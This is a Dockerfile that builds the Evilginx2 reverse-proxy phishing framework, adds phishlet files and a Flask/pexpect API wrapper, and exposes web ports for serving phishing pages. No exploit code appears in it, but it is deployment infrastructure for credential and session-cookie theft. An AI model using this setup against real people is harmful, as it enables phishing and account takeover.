# evilginx/Dockerfile
FROM golang:1.22-alpine AS builder

RUN apk add --no-cache git make gcc musl-dev

# Clone Evilginx2
RUN git clone https://github.com/kgretzky/evilginx2.git /go/src/github.com/kgretzky/evilginx2
WORKDIR /go/src/github.com/kgretzky/evilginx2

# Build Evilginx2
RUN go build -o /go/bin/evilginx main.go

# Create release image
FROM alpine:3.16

RUN apk add --no-cache ca-certificates

# Copy the Evilginx binary
COPY --from=builder /go/bin/evilginx /usr/local/bin/evilginx

# Create necessary directories
RUN mkdir -p /app/phishlets /app/redirectors /app/blacklist
WORKDIR /app

# Copy phishlets and custom files
COPY ./phishlets/ /app/phishlets/

# Install Python for API wrapper
RUN apk add --no-cache python3 py3-pip gcc musl-dev python3-dev libffi-dev openssl-dev
RUN pip3 install flask requests cryptography pyopenssl pexpect

# Create Evilginx API wrapper
COPY ./api_wrapper.py /app/api_wrapper.py

# Add script to update CA certificates on startup
RUN echo '#!/bin/sh' > /app/startup.sh && \
    echo 'update-ca-certificates' >> /app/startup.sh && \
    echo 'python3 /app/api_wrapper.py' >> /app/startup.sh && \
    chmod +x /app/startup.sh

# Expose required ports
EXPOSE 80 443 8443

# Start with CA certificate update
CMD ["/app/startup.sh"]
